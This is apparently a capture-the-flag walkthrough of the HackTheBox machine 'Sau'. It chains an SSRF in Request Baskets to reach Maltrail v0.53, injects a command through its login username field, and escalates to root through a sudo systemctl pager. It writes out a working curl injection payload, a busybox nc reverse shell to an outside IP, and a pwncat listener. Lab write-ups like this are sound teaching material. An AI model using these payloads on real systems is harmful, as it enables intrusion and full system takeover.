We start with an all ports enumeration with nmap:

	nmap -p- 10.10.11.224

output:

	

we can see that there is open 55555 and a filtered 8338(maltrail run behind this port), for the moment we can visit the following url:

	http://10.10.11.224:55555

in this website run Request Baskets(web service to collect arbitrary HTTP requests and inspect them via RESTful API or simple web UI).
Searching on internet "Request Baskets exploit" it's vulnerable to SSRF(Server-Side Requests Forgery) and there is a poc on this site:

	https://notes.sjtu.edu.cn/s/MUUhEymt7

we can create a new bucket, go to settings and insert this options:

	Forward URL:
	http://127.0.0.1:8338/ /8338 suspicious port/ 
	enable Proxy response
	enable Expand Forward Path

now we browse this URL:

	http://sau.htb:55555/<name basket>

we're inside in a strange page of maltrail, at the bottom of the page there is an important info _Powered by Maltrail (v0.53)_; it's time to search it on internet some exploit.

interesting site:

	https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/

payload:

	curl 'http://sau.htb:8338/<basket>/login' --data 'username=;`id > /tmp/bbq`'

we modify it:

	curl 'http://sau.htb:8338/<basket>/login' --data 'username=;`busybox nc 10.10.16.40 7777 -e /bin/bash`'
	python3 -m pwncat -lp 7777

we're in and we can retrieve the user flag, if we do the sudo -l command we have this following command:

	(ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service

we can run this command:

	sudo /usr/bin/systemctl status trail.service

inside:

	/bin/bash

sbma we're root thanks to pager--soft link--> /bin/less that it can executes shell command.
we can retrieve root flag.